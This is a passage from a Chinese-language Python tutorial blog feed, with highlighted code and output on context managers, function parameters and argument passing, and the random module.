class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ManagedFile</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, filename</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;init&#x27;</span>, filename)</span><br><span class="line">        self.filename = filename</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line">        self.file = <span class="built_in">open</span>(self.filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_value, exc_traceback</span>):</span><br><span class="line">        <span class="keyword">if</span> self.file:</span><br><span class="line">            self.file.close()</span><br><span class="line">        <span class="keyword">if</span> exc_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Exception has been handled&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> ManagedFile(<span class="string">&#x27;notes2.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line">    f.do_something()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;continuing...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init notes2.txt</span><br><span class="line">enter</span><br><span class="line">doing stuff...</span><br><span class="line">Exception has been handled</span><br><span class="line">exit</span><br><span class="line">continuing...</span><br></pre></td></tr></table></figure><h3><span id="jiang-shang-xia-wen-guan-li-qi-shi-xian-wei-sheng-cheng-qi">将上下文管理器实现为生成器</span></h3><p>除了编写类，我们还可以编写一个生成器函数，并使用 <code>contextlib.contextmanager</code> 装饰器对其进行装饰。 然后，我们也可以使用 <code>with</code> 语句调用该函数。 对于这种方法，函数必须在 <code>try</code> 语句中 <code>yield</code> 资源，并且释放资源的 <code>__exit__</code> 方法的所有内容现在都在相应的 <code>finally</code> 语句内。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> contextmanager</span><br><span class="line"></span><br><span class="line"><span class="meta">@contextmanager</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_managed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span> f</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open_managed_file(<span class="string">&#x27;notes.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>生成器首先获取资源。 然后，它暂时挂起其自己的执行并 <em>产生</em> 资源，以便调用者可以使用它。 当调用者离开 <code>with</code> 上下文时，生成器继续执行并释放 <code>finally</code> 语句中的资源。</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      21. 上下文管理器 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>18. 函数参数 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-129/"/>
    <id>https://qiwihui.com/qiwihui-blog-129/</id>
    <published>2022-08-13T01:54:25.580Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>在本文中，我们将详细讨论函数形参（parameters）和函数实参（arguments）。 我们将学习：</p><ul><li>形参和实参之间的区别</li><li>位置和关键字参数</li><li>默认参数</li><li>变长参数（ <code>*args</code> 和 <code>**kwargs</code>）</li><li>容器拆包成函数参数</li><li>局部与全局参数</li><li>参数传递（按值还是按引用？）</li></ul><span id="more"></span><h3><span id="xing-can-he-shi-can-zhi-jian-de-qu-bie">形参和实参之间的区别</span></h3><ul><li>形数是定义函数时在括号内定义或使用的变量</li><li>实参是调用函数时为这些参数传递的值</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_name</span>(<span class="params">name</span>): <span class="comment"># name 是形参</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">print_name(<span class="string">&#x27;Alex&#x27;</span>) <span class="comment"># &#x27;Alex&#x27; 是实参</span></span><br></pre></td></tr></table></figure><h3><span id="wei-zhi-he-guan-jian-zi-can-shu">位置和关键字参数</span></h3><p>我们可以将参数作为位置参数或关键字参数传递。 关键字参数的一些好处可能是：</p><ul><li>我们可以通过名称来调用参数，以使其更清楚地表示其含义</li><li>我们可以通过重新排列参数的方式来使参数最易读</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 位置参数</span></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键字参数</span></span><br><span class="line">foo(a=<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>)</span><br><span class="line">foo(c=<span class="number">3</span>, b=<span class="number">2</span>, a=<span class="number">1</span>) <span class="comment"># 注意此处顺序不重要</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 混合使用</span></span><br><span class="line">foo(<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下不允许</span></span><br><span class="line"><span class="comment"># foo(1, b=2, 3) # 位置参数在关键字参数之后</span></span><br><span class="line"><span class="comment"># foo(1, b=2, a=3) # &#x27;a&#x27; 有多个值</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3><span id="mo-ren-can-shu">默认参数</span></h3><p>函数可以具有带有预定义值的默认参数。 可以忽略此参数，然后将默认值传递给函数，或者可以将参数与其他值一起使用。 注意，必须将默认参数定义为函数中的最后一个参数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, c, d=<span class="number">4</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c, d)</span><br><span class="line"></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">foo(<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>, d=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不允许：默认参数必需在最后</span></span><br><span class="line"><span class="comment"># def foo(a, b=2, c, d=4):</span></span><br><span class="line"><span class="comment">#     print(a, b, c, d)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">100</span></span><br></pre></td></tr></table></figure><h3><span id="bian-chang-can-shu-args-he-kwargs">变长参数（ <code>*args</code> 和 <code>**kwargs</code>）</span></h3><ul><li>如果用一个星号（ <code>*</code> ）标记参数，则可以将任意数量的位置参数传递给函数（通常称为 <code>*args</code>）</li><li>如果用两个星号（ <code>**</code> ）标记参数，则可以将任意数量的关键字参数传递给该函数（通常称为  <code>**kwargs</code> ）。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, *args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b)</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        <span class="built_in">print</span>(arg)</span><br><span class="line">    <span class="keyword">for</span> kwarg <span class="keyword">in</span> kwargs:</span><br><span class="line">        <span class="built_in">print</span>(kwarg, kwargs[kwarg])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3, 4, 5 合并入 args</span></span><br><span class="line"><span class="comment"># six and seven 合并入 kwargs</span></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, six=<span class="number">6</span>, seven=<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以省略 args 或 kwargs</span></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, three=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">six <span class="number">6</span></span><br><span class="line">seven <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line">three <span class="number">3</span></span><br></pre></td></tr></table></figure><h3><span id="qiang-zhi-guan-jian-zi-can-shu">强制关键字参数</span></h3><p>有时你想要仅使用关键字的参数。 你可以执行以下操作：</p><ul><li>如果在函数参数列表中输入 <code>*,</code>，则此后的所有参数都必须作为关键字参数传递。</li><li>变长参数后面的参数必须是关键字参数。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, *, c, d</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c, d)</span><br><span class="line"></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, c=<span class="number">3</span>, d=<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 不允许:</span></span><br><span class="line"><span class="comment"># foo(1, 2, 3, 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变长参数后面的参数必须是关键字参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">*args, last</span>):</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        <span class="built_in">print</span>(arg)</span><br><span class="line">    <span class="built_in">print</span>(last)</span><br><span class="line"></span><br><span class="line">foo(<span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, last=<span class="number">50</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure><h3><span id="chai-bao-cheng-can-shu">拆包成参数</span></h3><ul><li>如果容器的长度与函数参数的数量匹配，则列表或元组可以用一个星号（ <code>*</code> ）拆包为参数。</li><li>字典可以拆包为带有两个星号（ <code>**</code> ）的参数，其长度和键与函数参数匹配。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># list/tuple 拆包，长度必需匹配</span></span><br><span class="line">my_list = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>] <span class="comment"># or tuple</span></span><br><span class="line">foo(*my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dict 拆包，键和长度必需匹配</span></span><br><span class="line">my_dict = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">foo(**my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># my_dict = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;d&#x27;: 3&#125; # 不可能，因为关键字错误</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3><span id="ju-bu-bian-liang-yu-quan-ju-bian-liang">局部变量与全局变量</span></h3><p>可以在函数体内访问全局变量，但是要对其进行修改，我们首先必须声明 <code>global var_name</code> 才能更改全局变量。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo1</span>():</span><br><span class="line">    x = number <span class="comment"># 全局变量只能在这里访问</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;number in function:&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">number = <span class="number">0</span></span><br><span class="line">foo1()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改全局变量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo2</span>():</span><br><span class="line">    <span class="keyword">global</span> number <span class="comment"># 现在可以访问和修改全局变量</span></span><br><span class="line">    number = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number before foo2(): &#x27;</span>, number)</span><br><span class="line">foo2() <span class="comment"># 修改全局变量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number after foo2(): &#x27;</span>, number)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number <span class="keyword">in</span> function: <span class="number">0</span></span><br><span class="line">number before foo2():  <span class="number">0</span></span><br><span class="line">number after foo2():  <span class="number">3</span></span><br></pre></td></tr></table></figure><p>如果我们不写 <code>global var_name</code> 并给与全局变量同名的变量赋一个新值，这将在函数内创建一个局部变量。 全局变量保持不变。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo3</span>():</span><br><span class="line">    number = <span class="number">3</span> <span class="comment"># 这是局部变量</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number before foo3(): &#x27;</span>, number)</span><br><span class="line">foo3() <span class="comment"># 不会修改全局变量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number after foo3(): &#x27;</span>, number)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number before foo3():  <span class="number">0</span></span><br><span class="line">number after foo3():  <span class="number">0</span></span><br></pre></td></tr></table></figure><h3><span id="can-shu-chuan-di">参数传递</span></h3><p>Python使用一种称为“对象调用”或“对象引用调用”的机制。必须考虑以下规则：</p><ul><li>传入的参数实际上是对对象的引用（但引用是按值传递）</li><li>可变和不可变数据类型之间的差异</li></ul><p>这意味着：</p><ol><li>可变对象（例如列表，字典）可以在方法中进行更改。但是，如果在方法中重新绑定引用，则外部引用仍将指向原始对象。</li><li>不能在方法中更改不可变的对象（例如int，string）。但是<strong>包含在</strong>可变对象中的不可变对象可以在方法中重新分配。</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不可变对象 -&gt; 不变</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">x</span>):</span><br><span class="line">    x = <span class="number">5</span> <span class="comment"># x += 5 也无效，因为x是不可变的，必须创建一个新变量</span></span><br><span class="line"></span><br><span class="line">var = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;var before foo():&#x27;</span>, var)</span><br><span class="line">foo(var)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;var after foo():&#x27;</span>, var)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var before foo(): <span class="number">10</span></span><br><span class="line">var after foo(): <span class="number">10</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可变对象 -&gt; 可变</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list.append(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before foo():&#x27;</span>, my_list)</span><br><span class="line">foo(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after foo():&#x27;</span>, my_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list before foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list after foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不可变对象包含在可变对象内 -&gt; 可变</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list[<span class="number">0</span>] = -<span class="number">100</span></span><br><span class="line">    a_list[<span class="number">2</span>] = <span class="string">&quot;Paul&quot;</span></span><br><span class="line">    </span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;Max&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before foo():&#x27;</span>, my_list)</span><br><span class="line">foo(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after foo():&#x27;</span>, my_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重新绑定可变引用 -&gt; 不变</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list = [<span class="number">50</span>, <span class="number">60</span>, <span class="number">70</span>] <span class="comment"># a_list 是函数内新的局部变量</span></span><br><span class="line">    a_list.append(<span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before foo():&#x27;</span>, my_list)</span><br><span class="line">foo(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after foo():&#x27;</span>, my_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list before foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list after foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>对于可变类型，请小心使用 <code>+=</code> 和 <code>=</code> 操作。 第一个操作对传递的参数有影响，而后者则没有：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重新绑定引用的另一个例子</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list += [<span class="number">4</span>, <span class="number">5</span>] <span class="comment"># 这会改变外部变量</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bar</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list = a_list + [<span class="number">4</span>, <span class="number">5</span>] <span class="comment"># 在会重新绑定引用到本地变量</span></span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before foo():&#x27;</span>, my_list)</span><br><span class="line">foo(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after foo():&#x27;</span>, my_list)</span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before bar():&#x27;</span>, my_list)</span><br><span class="line">bar(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after bar():&#x27;</span>, my_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list before foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list after foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">my_list before bar(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list after bar(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      18. 函数参数 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>12. 随机数 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-139/"/>
    <id>https://qiwihui.com/qiwihui-blog-139/</id>
    <published>2022-08-13T01:54:25.580Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Python定义了一组用于生成或操作随机数的函数。 本文介绍：</p><ul><li><code>random</code> 模块</li><li>用 <code>random.seed()</code> 再生产数字</li><li>使用 <code>secrets</code> 模块创建密码学上强的随机数</li><li>用 <code>numpy.random</code> 创建随机 nd 数组</li></ul><h3><span id="random-mo-kuai"><code>random</code> 模块</span></h3><p>该模块为各种版本实现伪随机数生成器。它使用Mersenne Twister算法（<a href="https://en.wikipedia.org/wiki/Mersenne_Twister">https://en.wikipedia.org/wiki/Mersenne_Twister</a>）作为其核心生成器。 之所以称其为伪随机数，是因为数字看起来是随机的，但是是可重现的。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># [0,1) 之间随机浮点数</span></span><br><span class="line">a = random.random()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [a,b] 之间随机浮点数</span></span><br><span class="line">a = random.uniform(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [a,b] 之间随机整数，b 包括。</span></span><br><span class="line">a = random.randint(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之间随机整数，b 不包括。</span></span><br><span class="line">a = random.randrange(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数为 mu 和 sigma 的正态分布随机浮点数</span></span><br><span class="line">a = random.normalvariate(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从序列中随机选择元素</span></span><br><span class="line">a = random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从序列中随机选择 k 个唯一元素</span></span><br><span class="line">a = random.sample(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>), <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择可重复的k个元素，并返回大小为k的列表</span></span><br><span class="line">a = random.choices(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>),k=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原地随机排列</span></span><br><span class="line">a = <span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)</span><br><span class="line">random.shuffle(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0.10426373452067317</span></span><br><span class="line"><span class="number">3.34983979352444</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">-<span class="number">1.004568769635799</span></span><br><span class="line">E</span><br><span class="line">[<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;A&#x27;</span>]</span><br></pre></td></tr></table></figure><h3><span id="chong-zi-sheng-cheng-qi">种子生成器</span></h3><p>使用 <code>random.seed()</code>，可以使结果可重复，并且 <code>random.seed()</code> 之后的调用链将产生相同的数据轨迹。 随机数序列变得确定，或完全由种子值确定。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Seeding with 1...\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nRe-seeding with 42...\n&#x27;</span>)</span><br><span class="line">random.seed(<span class="number">42</span>)  <span class="comment"># 重设随机种子</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nRe-seeding with 1...\n&#x27;</span>)</span><br><span class="line">random.seed(<span class="number">1</span>)  <span class="comment"># 重设随机种子</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nRe-seeding with 42...\n&#x27;</span>)</span><br><span class="line">random.seed(<span class="number">42</span>)  <span class="comment"># 重设随机种子</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Seeding <span class="keyword">with</span> <span class="number">1.</span>..</span><br><span class="line"></span><br><span class="line"><span class="number">0.13436424411240122</span></span><br><span class="line"><span class="number">8.626903632435095</span></span><br><span class="line">B</span><br><span class="line"></span><br><span class="line">Re-seeding <span 